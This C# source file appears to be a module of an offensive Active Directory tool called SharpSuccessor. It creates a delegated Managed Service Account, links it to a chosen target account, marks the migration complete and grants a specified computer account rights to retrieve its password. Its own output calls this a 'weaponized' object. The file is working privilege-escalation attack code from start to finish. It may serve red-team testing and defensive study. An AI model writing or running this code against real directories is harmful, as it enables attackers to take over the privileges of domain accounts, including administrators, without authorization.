using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace SharpSuccessor.Modules
{
    internal class dMSA
    {
        public static string accountToSidLookup(string account)
        {
            SearchResultCollection results;

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);

            string query = "(samaccountname=" + account + ")";
            ds.Filter = query;
            results = ds.FindAll();
            string accountSid = null;

            foreach (SearchResult sr in results)
            {
                SecurityIdentifier sid = new SecurityIdentifier(sr.Properties["objectSid"][0] as byte[], 0);
                accountSid = sid.Value;
            }

            return accountSid;
        }

        public static void CreatedMSA(string path, string name, string computer, string target)
        {
            Domain currentDomain = Domain.GetCurrentDomain();
            string childName = "CN=" + name;

            try
            {
                DirectoryEntry parentEntry = new DirectoryEntry("LDAP://" + path);
                DirectoryEntry newChild = parentEntry.Children.Add(childName, "msDS-DelegatedManagedServiceAccount");
                newChild.Properties["msDS-DelegatedMSAState"].Value = 0;
                newChild.Properties["msDS-ManagedPasswordInterval"].Value = 30;
                Console.WriteLine("[+] Adding dnshostname " + name + "." + currentDomain.Name);
                newChild.Properties["dnshostname"].Add(name + "." + currentDomain.Name);
                Console.WriteLine("[+] Adding samaccountname " + name + "$");
                newChild.Properties["samaccountname"].Add(name+"$");

                SearchResultCollection results;

                DirectoryEntry de = new DirectoryEntry();
                DirectorySearcher ds = new DirectorySearcher(de);

                string query = "(samaccountname=" + target + ")";
                ds.Filter = query;
                results = ds.FindAll();

                if (results.Count == 0)
                {
                    Console.WriteLine("[!] Cannot find account");
                    return ;
                }

                string targetdn = null;

                foreach (SearchResult sr in results)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    targetdn = mde.Properties["distinguishedName"].Value.ToString();
                    Console.WriteLine("[+] " + target + "'s DN identified");
                }

                Console.WriteLine("[+] Attempting to write msDS-ManagedAccountPrecededByLink");
                newChild.Properties["msDS-ManagedAccountPrecededByLink"].Add(targetdn);

                Console.WriteLine("[+] Wrote attribute successfully");
                Console.WriteLine("[+] Attempting to write msDS-DelegatedMSAState attribute");
                newChild.Properties["msDS-DelegatedMSAState"].Value = 2;
                Console.WriteLine("[+] Attempting to set access rights on the dMSA object");

                string sid = accountToSidLookup(computer);

                if (sid == null)
                {
                    Console.WriteLine("[!] Cannot find computer account");
                    return;
                }
                RawSecurityDescriptor rsd = new RawSecurityDescriptor("O:S-1-5-32-544D:(A;;0xf01ff;;;" + sid + ")");
                Byte[] descriptor = new byte[rsd.BinaryLength];
                rsd.GetBinaryForm(descriptor, 0);
                newChild.Properties["msDS-GroupMSAMembership"].Add(descriptor);
                Console.WriteLine("[+] Attempting to write msDS-SupportedEncryptionTypes attribute");
                newChild.Properties["msDS-SupportedEncryptionTypes"].Value = 0x1c;
                Console.WriteLine("[+] Attempting to write userAccountControl attribute");
                newChild.Properties["userAccountControl"].Value = 0x1000;


                newChild.CommitChanges();

                Console.WriteLine($"[+] Created dMSA object '{newChild.Name}' in '{path}'");
                Console.WriteLine("[+] Successfully weaponized dMSA object");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                return;
            }

        }
    }
}
